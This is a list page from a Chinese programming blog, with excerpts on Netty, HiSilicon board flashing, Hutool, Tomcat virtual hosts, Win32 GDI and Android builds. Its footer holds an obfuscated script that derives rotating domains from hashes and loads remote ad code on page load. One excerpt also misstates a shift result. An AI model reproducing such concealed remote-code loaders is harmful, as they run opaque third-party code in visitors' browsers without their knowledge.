begin,int end){//把从begin-end的节点插入到大规模子树中，并且统计其总的逆序对数 long long lens=0,rans=0; int i; for(i=begin;i&lt;end;i++){//计算逆序对数 int tem = rank(node,key[i]); lens += tem; rans += S[node] - tem; } ans += lens &lt; rans ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/697b08307dd8ae2700bdf1189f04f0ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01d3ec3d5829df87560823c2725f6fe0/" rel="bookmark">
			NIO与Netty的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下：
NIO需要手动创建buffer缓冲区
Netty不需要创建，直接读取数据到已有的缓冲区中
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d1b9c4aaf10bafb508a5c0a2b81a47d/" rel="bookmark">
			【海思篇】【Hi3516DV300】二、使用串口烧写映像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目的：将上一章节编译出的映像文件烧写到板子上；让更多的爱好者了解海思、加入海思。
目录
1 准备工作
2 开始烧写
3 配置启动参数
4 结果
1 准备工作 1）准备海思工具HiTool.exe，启动后切换Hi3516DV300芯片(菜单栏：芯片-&gt;切换芯片-&gt;Hi3516DV300)；
2）准备串口板、海思3516DV300板、及串口线；
我的3516DV300海思板，内存是512MB，32MB的spi-nor flash；
3）配置PC串口，我用的是XShell
4）编好的映像文件（【海思篇】【Hi3516DV300】一、 逐步搭建开发环境）
-rw-r--r-- 1 developer developer 4.1M Mar 28 09:58 rootfs_hi3516dv300_64k.jffs2
-rwxr-xr-- 1 developer developer 299K Mar 28 09:50 u-boot-hi3516dv300.bin
-rw-rw-r-- 1 developer developer 3.5M Mar 27 18:33 uImage_hi3516dv300_smp
2 开始烧写 烧写步骤（用默认的按分区烧写）：
1）选择传输方式：串口
2）选择与串口板连接的串口：COM1（每个人电脑各不相同）
3）打开分区xml文件；没有的自己创建或者下载我上传的附件，然后再根据自己的映像文件和器件类型修改；
4）勾选fastboot、kernel、rootfs
5）选择器件类型：spi nor（每个人的3516DV300海思板各不相同，根据实际配置）；
6）可选步骤：没有分区xml文件的，手动添加方法参考上图的说明部分。配置好后，可以点&lt;保存按钮&gt;保存你的分区配置；
7）配置好串口后（参考准备部分），点击海思烧写工具&lt;烧写&gt;按钮，弹出进度条页面， 按下板上的串口升级按键，接通海思板的电源，然后海思烧写工具的进度条页面的进度条开始滚动。
3 配置启动参数 烧写完成后会进入uboot模式（有3s倒计时，3s内按回车会主动进入uboot）
Uncompress Ok! U-Boot 2016.11 (Mar 28 2020 - 09:50:11 +0800)hi3516dv300 Relocation Offset is: 0f6c2000 Relocating to 8fec2000, new gd at 8fe21ef0, sp at 8fe21ed0 SPI Nor: Check Flash Memory Controller v100 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d1b9c4aaf10bafb508a5c0a2b81a47d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9068ccb3b8aaca1449012d1ed549c172/" rel="bookmark">
			hutool工具类的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		copy自 https://mp.weixin.qq.com/s/ju7BExM1P64IpGdCYAOYkQ@TOC 觉得很好用，拷贝下来存着。
贼好用的 Java 工具类库
Ryan Wang 方志朋 昨天
点击上方“方志朋”，选择“设为星标”
回复”666“获取新整理的面试文章
来源：ryanc.cc/archives/hutool-java-tools-lib
简介
Hutool是Hu + tool的自造词，前者致敬我的“前任公司”，后者为工具之意，谐音“糊涂”，寓意追求“万事都作糊涂观，无所谓失，无所谓得”的境界。
Hutool是一个Java工具包，也只是一个工具包，它帮助我们简化每一行代码，减少每一个方法，让Java语言也可以“甜甜的”。Hutool最初是我项目中“util”包的一个整理，后来慢慢积累并加入更多非业务相关功能，并广泛学习其它开源项目精髓，经过自己整理修改，最终形成丰富的开源工具集。
功能
一个Java基础工具类，对文件、流、加密解密、转码、正则、线程、XML等JDK方法进行封装，组成各种Util工具类，同时提供以下组件：
hutool-aop JDK动态代理封装，提供非IOC下的切面支持
hutool-bloomFilter 布隆过滤，提供一些Hash算法的布隆过滤
hutool-cache 缓存
hutool-core 核心，包括Bean操作、日期、各种Util等
hutool-cron 定时任务模块，提供类Crontab表达式的定时任务
hutool-crypto 加密解密模块
hutool-db JDBC封装后的数据操作，基于ActiveRecord思想
hutool-dfa 基于DFA模型的多关键字查找
hutool-extra 扩展模块，对第三方封装（模板引擎、邮件等）
hutool-http 基于HttpUrlConnection的Http客户端封装
hutool-log 自动识别日志实现的日志门面
hutool-script 脚本执行封装，例如Javascript
hutool-setting 功能更强大的Setting配置文件和Properties封装
hutool-system 系统参数调用封装（JVM信息等）
hutool-json JSON实现
hutool-captcha 图片验证码实现
简单测试
这两天使用Hutool把Halo里面的一些代码给替换掉了，不得不说，用起来十分顺心，下面简单介绍一下我用到的一些Hutool的工具类。
SecureUtil（加密解密工具）
主要是在登录的时候还有修改密码的时候用到的，因为数据库里面的密码是md5加密处理的，所以登录的时候需要先加密之后再到数据库进行查询，使用Hutool的话，只需要调用SecureUtil中的md5方法就可以了。
user = userService.userLoginByName(loginName,SecureUtil.md5(loginPwd));
HtmlUtil（HTML工具类）
这个工具类就比较厉害了，不过我在Halo当中用得最多的还是HtmlUtil.encode，可以将一些字符转化为安全字符，防止xss注入和SQL注入，比如下面的评论提交。
comment.setCommentAuthor(HtmlUtil.encode(comment.getCommentAuthor()));
这就是防止有小坏蛋故意写一些可执行的js代码，然后提交评论，在后台面板就会执行这一段代码，比较危险，使用encode方法就可以将
热门内容：
Java项目构建基础：统一结果，统一异常，统一日志（好文推荐）
Kafka为什么这么快？
一线大厂的分布式唯一ID生成方案是什么样的？
JVM 史上最最最完整深入解析（12000 字噢）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9068ccb3b8aaca1449012d1ed549c172/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f4996ec68b2ef6138caadc102f5fb05/" rel="bookmark">
			单片机ADC采样算法----中位值滤波法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中位值滤波法就是通过连续采样奇数个数据，然后对数据从小到大排序，取中间的值做为本次采样值。
下面看C代码的实现
#define M 11 unsigned int filter2( void ) { unsigned int value_buf[M]; unsigned int count, i, j, temp; for( count = 0; count &lt; M; count++ ) { value_buf[count] = ReadVol_CH2(); } for( j = 0; j &lt; M - 1; j++ ) { for( i = 0; i &lt; M - j - 1; i++ ) { if( value_buf[i] &gt; value_buf[i + 1] ) { temp = value_buf[i]; value_buf[i] = value_buf[i + 1]; value_buf[i + 1] = temp; } } } return value_buf[( M - 1 ) / 2]; } M为每次采样的数据个数，M要为奇数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f4996ec68b2ef6138caadc102f5fb05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5afd7ea31379bc0e32d9d5713dd750bb/" rel="bookmark">
			Tomcat实现虚拟主机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、tomcat的源码安装过程（或直接yum安装） 1.1、安装jdk (1)上传jdk与tomcat软件包 (2)将jdk解压 tar xf jdk-8u161-linux-x64.tar.gz
(3)将解压文件移动到/usr/java并改名为jdk1.8 mv jdk1.8.0_161 /usr/local/java8
(4)配置环境变量 vim /etc/profile
export JAVA_HOME=/usr/local/java8 export PATH=$PATH:$JAVA_HOME/bin (5) 加载环境变量 source /etc/profile
1.2、安装tomcat (1)将tomcat解压 tar xf apache-tomcat-8.0.36.tar.gz
(2)将解压文件移动到/usr/local/下，并命名为tomcat8 mv apache-tomcat-8.0.36 /usr/local/tomcat8
(3)启动 cd /usr/local/tomcat8/bin/
./startup.sh
(4)查看进程 ps -ef |grep tomcat
2、虚拟主机配置 2.1、配置hosts解析 打开，C:\Windows\System32\drivers\etc\hosts，添加：
192.168.108.4 www.anttech.com
192.168.108.4 www.xingyun.com
2.2、备份配置文件 [root@localhost ~]# cd /usr/local/tomcat8/conf/
[root@localhost conf]# cp server.xml server.xml.$(date +%F)
2.3、修改配置文件 [root@localhost conf]# vim server.xml
&lt;Host name="www.xingyun.com" appBase="webapps" unpackWARs="true" autoDeploy="true"&gt; &lt;Context docBase="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5afd7ea31379bc0e32d9d5713dd750bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d7368e69f2aa0c2e14ba4101d70454b/" rel="bookmark">
			SetBkMode、SetMapMode、SetWindowExt、SetViewportExt使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、SetBkMode原型声明：
WINGDIAPI int WINAPI SetBkMode(_In_ HDC hdc, _In_ int mode)
设置背景模式，mode取值：OPAQUE(不透明)，TRANSPARENT(透明)
2、SetMapMode原型声明：
WINGDIAPI int WINAPI SetMapMode(_In_ HDC hdc, _In_ int iMode)
设置映射模式，mode取值：
MM_ANISOTROPIC：逻辑单元被映射到具有任意缩放轴的任意单元。使用SetWindowExtEx和SetViewportExtEx函数指定单元、方向和缩放。
MM_ISOTROPIC：逻辑单元被映射到具有等比例轴的任意单元；也就是说，沿着x轴的一个单元等于沿着y轴的一个单元。使用SetWindowExtEx和SetViewportExtEx函数指定轴的单位和方向。图形设备接口(GDI)进行必要的调整，以确保x和y单元保持相同的大小(当设置窗口范围时，视口将被调整以保持单元的各向同性)。
3、SetWindowExt原型声明：
WINGDIAPI BOOL WINAPI SetWindowExtEx( _In_ HDC hdc, _In_ int cxWindow, _In_ int cyWindow, _Out_opt_ LPSIZE lpsz)
设置窗口的水平x和垂直y范围。
4、SetViewportExt原型声明：
WINGDIAPI BOOL WINAPI SetViewportExtEx( _In_ HDC hdc, _In_ int cxViewport, _In_ int cyViewport, _Out_opt_ LPSIZE lpsz)
设置视口的水平x和垂直y范围。调用之前必须先调用SetWindowExtEx函数。
通常情况下SetWindowExt()函数和SetViewportExt()函数成对调用。它们的意思（功能）是：用cxViewport个物理像素来表现cxWindow个逻辑长度。同样用cyViewport个物理像素来表现cyWindow个逻辑长度。当cxViewport/cxWindow为正的情况下，X轴的方向是指向右方，反过来指向左方。 cyViewport/cyWindow为正的情况下，Y轴的方向是指向上方，反过来指向下方。 5、SetWindowOrg原型声明：
WINGDIAPI BOOL WINAPI SetWindowOrgEx( _In_ HDC hdc, _In_ int x, _In_ int y, _Out_opt_ LPPOINT lppt)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d7368e69f2aa0c2e14ba4101d70454b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23ef577a4a1d1bf898894d2fd4c90f68/" rel="bookmark">
			【海思篇】【Hi3516DV300】一、 逐步搭建开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目的: 熟悉环境和流程，让更多的爱好者了解海思、加入海思。
目录
1 安装ubunu14
2 软件包安装
3 安装交叉编译工具
4 安装SDK
步骤 1.解压缩 SDK 包
步骤 2. 展开 SDK 包内容
步骤 3. 编译uboot （参考osdrv下readme）
步骤 4. 编译kernel（参考osdrv下readme）
步骤 5. 制作根文件系统（参考osdrv下readme）
5 一键全部编译
1 安装ubunu14 我的ubuntu14如下，安装方法网上很多，通用。
#uname -a
Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
2 软件包安装 步骤 1. 配置默认使用 bash
执行 sudo dpkg-reconfigure dash 选择 no
步骤 2. 安装软件包
执行：sudo apt-get install make libc6:i386 lib32z1 lib32stdc++6 zlib1g-dev libncurses5-dev ncurses-term libncursesw5-dev g++ u-boot-tools:i386 texinfo texlive gawk libssl-dev openssl bc
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23ef577a4a1d1bf898894d2fd4c90f68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec88982eb8a357a754811484085edfc6/" rel="bookmark">
			算术左移、逻辑左移、算术右移、逻辑右移有什么不同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、算术左移-逻辑左移：都是右边补0。 比如 00101011，算术左移一位:01010110，逻辑左移一位:01010110。 对于二进制的数值来说左移n位等于原来的数值乘以2的n次方 比如00011010十进制是26，左移两位后是01101000转成十进制是104 恰好是26的4倍。 ps：这种倍数关系只适用于左移后被舍弃的高位不含1的情况， 否则会溢出。 2、算术右移，逻辑右移：将二进制数整体右移，左边补0即可。 如10101101逻辑右移一位为01010110 算术右移符号位要一起移动，并且在左边补上符号位， 也就是如果符号位是1就补1符号位是0就补0 比如：11100算术右移一位为11110（符号位1跟着一起移动并且左边补了1） 对于二进制的数值来说右移n位等于原来的数值除以2的n次方 比如10110100十进制是76 （需要先将这个补码转换成原码之后再转换成十进制）， 右移两位后是11101101转成十进制是19恰好是76的4倍。 算术左移和算术右移主要用来进行有符号数的倍增、减半； 逻辑左移和逻辑右移主要用来进行无符号数的倍增、减半。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bc6c91301f98220fd43571ba90b4d54/" rel="bookmark">
			android源码编译环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本机编译环境为linux系统，android源码为android-4.3_r1，jdk为1.6其环境搭建如下：
1.下载android源码（官网，网盘都可），请自行下载。
安装必要的开发包。在终端执行以下命令：
$sudo apt-get install git-core gnupg flex bison gperf build-essential \
zip curl libc6-dev libncurses5-dev:i386 libgl1-mesa-glx:i386\
libgl1-mesa-dev g++-multilib mingw32 openjdk-6-jdk tofrodos \
python-markdown libxm12-utils xsltproczlib1g-dev:i386
2.下载jdk1.6.0_13并设置jdk环境如下(也可以放在~/.bashrc里面)
在文件系统目录以root身份登录并修改/etc/profile文件，在profile文件尾部添加如下内容
#set java environment
export JAVA_HOME=/home/ada/jdk6/jdk1.6.0_13
export JRE_HOME=$JAVA_HOME/jre
export CLASSPATH=./:JAVA_HOME/lib:$JRE_HOME/lib
export PATH=$JAVA_HOME/bin:$PAT
保存后退出，执行source /etc/profile
最后测试jdk环境设置是否成功，如下所示表示成功。
3.进入所下载的android源码目录，下图为本机源码位置ls后可以看到源码各个目录文件。
4.编译android源代码
下载完android源代码后就可以对源代码进行编译了，但是在编译之前需要在android源代码的根目录执行如下命令来设置一些shell函数。
注意：如果执行成功，根据android版本的不同会输出类似如上图所示的信息。
5.设置编译目标
在编译android源代码之前要先设置编译的目标，也就是为那些设备编译android源代码。如果要让编译后的目标文件在模拟器或android真机上运行，则要执行如下命令来进行选择：
如上图所示直接选择数字序列号即可选择相应的目标并回车。本机是默认选择。
6.执行make命令
最后在android源码根目录执行make命令后就可以进行整个android源代码的编译了。编译过程时间有点长，需要耐心等待。执行的make命令如下：
如果机器是多核cpu则可以在指定编译时利用的cpu核数。如上其中-j4表示利用了4个cpu核，log.txt是编译过程中写入的log日志文件，该文件可以定位编译过程中出现的异常现象从而进行快速解决。
编译完android源代码后，会在anroid源码根目录生成一个out目录，所编译生成的目标文件都在该目录的相应子目录中。其中最重要的有三个镜像文件ramdisk.img，system.img，userdata.img，这3个文件所在的目录为out/target/product/generic。如下所示：
7.模拟器emulator的环境设置
打开.bashrc文件并设置模拟器emulator所需环境配置，在该文件中添加如下内容
保存所添加的内容后并执行source ～/.bashrc
8.启动模拟器emulator
在android源码根目录下执行emulator命令即可启动。如下所示：
至此界面出现说明成功启动模拟器。
附录：
user，userdebug，eng区别
user：设定属性 ro.secure=1，打开安全检查功能。设定属性 ro.debuggable=0，关闭应用调试功能。默认关闭 adb 功能并无法获取root权限。
userdebug：设定属性 ro.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bc6c91301f98220fd43571ba90b4d54/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/441/">«</a>
	<span class="pagination__item pagination__item--current">442/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/443/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>